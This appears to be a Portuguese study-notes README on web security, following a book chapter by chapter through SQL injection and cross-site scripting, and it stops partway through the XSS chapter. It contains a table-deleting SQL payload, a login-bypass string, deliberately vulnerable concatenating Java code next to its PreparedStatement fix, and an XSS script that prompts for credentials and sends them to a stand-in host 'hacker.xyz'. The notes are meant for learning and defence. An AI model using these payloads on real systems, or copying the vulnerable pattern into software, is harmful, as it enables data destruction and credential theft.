# safety-web

	Repositório criado para o estudo de segurança na web, inicialmente com o livro [ Segurança em aplicações WEB ] (https://www.casadocodigo.com.br/products/livro-seguranca).


Principais tipo de ataques abordados:

*SQL injection
*Cross-site Scripting (XSS)
*Cross-site Request Forgery (CSRF)
*Session Hijacking


## Capitulo 01 ( O velho e conhecido SQL Injection )

#### Vunerabilidade 
	
em aplicações com banco de dados SQL, por muitas vezes precisamos fazer buscas dinamicas algo como:
````
SELECT	*	FROM	produtos	
	WHERE	preco	BETWEEN	1000.00	AND	5000.00;
````
mas em uma aplicação os valores do intervalo precisam ser dinamicos... algo como:
````
SELECT	*	FROM	produtos	
	WHERE	preco	BETWEEN	:valorMinimo	AND	:valorMaximo;
````
nesse caso temos valorMinimo e valorMaximo, essas variáveis serão acessiveis no back end e possivelmente vão vir do front, e é ai que mora o perigo do SQL injection.

#### Como funciona?

o SQL injection acontece quando o usuário malicioso insere uma query SQL em algum input, enviando-a para o back end criando assim um comportamento diferente do previsto, se essa informação
não for tratada antes de ser executada pode causar grandes danos, um exemplo simples seria um trexo de como :
````
';delete from usuarios;
````
se esse comando for executado em um back end sem validação e que está concatenando os valores vindos do front na query sql, ele ira apagar todos os dados da tabela usuário, ou seja se não tem backup deu merda...

#### Testando uma aplicação

existem várias maneiras de testar o SQL Injection, uma delas seria na tela clássica de login digitando.. ```` '	or	1	or	'a'	=	'a ```` e no campo senha digitamos qualquer coisa, se ao clicar me logar você for redirecionado para alguma tela interna é porque  a aplicação está vulnerável ao ataque, vamos entender melhor o que está acontecendo... normalmente as verificações de usuário e senha consistem em uma query algo como ```` SELECT * FROM usuarios WHERE login = 'admin' AND senha = '1234'; ```` sendo 'admin' e '1234' os valores digitados na tela de login... em java o código no back end seria algo como :
````java
public	Usuario	buscaPorLoginESenha(String	login,	String	senha)	{
	String	sql	=	"SELECT	*	FROM	usuarios	WHERE	login	=	'"	+login	+"'	AND	senha	=	'"	+senha	+"'";
	Connection	con	=	//recupera	a	connection...
	ResultSet	resultado	=	con.createStatement().executeQuery(sql);
	return	montaObjetoUsuario(resultado);
}

```` 
veja que o código está concatenando a string login e senha que vem por parametro... o que acontece é algo como : Login = '[' or 1 or 'a' = 'a'] AND senha = 'valorqualquer' esssa expressão vai retornar true como se a consulta encontrasse o resultado válido no banco.

#### Como se proteger desse ataque

*A	regra	que	gosto	de	citar	é	bem	simples:	NÃO	CONFIE	NOS SEUS	USUÁRIOS!

para se proteger desse ataque devemos sempre tratar os dados vindos do front, e para além devemos também usar frameworks ORMs que nos ajudaram nessa tarefa, e usando das melhores tecnicas podem prover uma maior segurança para a nossa aplicação, e nunca nunca devemos concatenar os dados do front em scripts SQL... vamos agora refatorar o exemplo anterior para proteger a aplicação do SQL injection, podemos fazer isso usando o PreparedStatement no lugar do Statement.
````java
public	Usuario	buscaPorLoginESenha(String	login,	String	senha)	{
	String	sql	=	"SELECT	*	FROM	usuarios	WHERE	
	login	=	?	AND	senha	=	?";
	Connection	con	=	//recupera	a	connection...
	PreparedStatement	ps	=	con.prepareStatement(sql);
	ps.setString(1,	login);
	ps.setString(2,	senha);
	ResultSet	resultado	=	ps.executeQuery();
	return	montaObjetoUsuario(resultado);
}
````

## Capitulo 02 ( cross-site scripting - XSS)

#### Vulnerabilidade

Acontece quando o sistema permite que o usuário insira código html, css e javascript através de inputs, essa vulnerabilidade foi pela primeira vez explorada em 2005 por Samy Kamkar, um hacker de 19 anos que executou um scripting no Myspace e conseguiu 24 milhoes de amigos em menos de 24 horas, o ataque consistia em basicamente em inserir um código javascript em um input que era usado para colocar código css e deixar o perfil customizado ( código css não gera riscos ), o risco ocorre quando aceita também códigos javascript.

#### Como funciona?

O XSS funciona da seguinte maneira... o usuário malicioso envia um código javascript para a aplicação, a partir desse momento todos os navegadores que acessarem essa página irão executar esse script, e as alternativas são muitas.. como o script pode solicitar usuário e senha da aplicação, ele pode redirecionar para outra página, ou como o Samy ele pode fazer a pessoa te adicionar na rede social, curtir suas fotos e fazer uma declaração..  um exemplo de XSS seria:
````
<script>
var	login	=	prompt("Digite	seu	Login:");
var	senha	=	prompt("Digite	sua	Senha:");
var	url	=	"http://hacker.xyz/xss?login="	+login	+"&senha="	+senha;
var	req	=	new	XMLHttpRequest();
req.open("POST",	url,	true);
req.send();
</script>
```` 
para enviar esse script para outra pessoa podemos usar a url que em inputs de busca normalmente se comporta da seguinte maneira.. http://www.exemplo.com/busca?termodabusca, então onde tem o termo da busca pode ser inserido o script ,enviando o endereço com o script ele vai ser executado no computador na vítima.
 

PAGINA 22